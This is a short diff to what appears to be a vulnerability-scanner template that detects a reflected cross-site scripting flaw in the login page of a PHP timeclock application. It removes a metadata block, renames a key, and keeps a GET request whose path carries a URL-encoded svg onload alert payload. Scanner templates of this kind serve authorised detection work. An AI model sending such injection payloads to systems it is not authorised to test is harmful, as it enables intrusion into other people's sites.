@@ -12,10 +12,8 @@ info:
     cvss-score: 7.2
     cwe-id: CWE-79
   tags: xss,php,timeclock,edb
-  metadata:
-    max-request: 1
 
-http:
+requests:
   - method: GET
     path:
       - "{{BaseURL}}/login.php/'%3E%3Csvg/onload=alert%60{{randstr}}%60%3E"
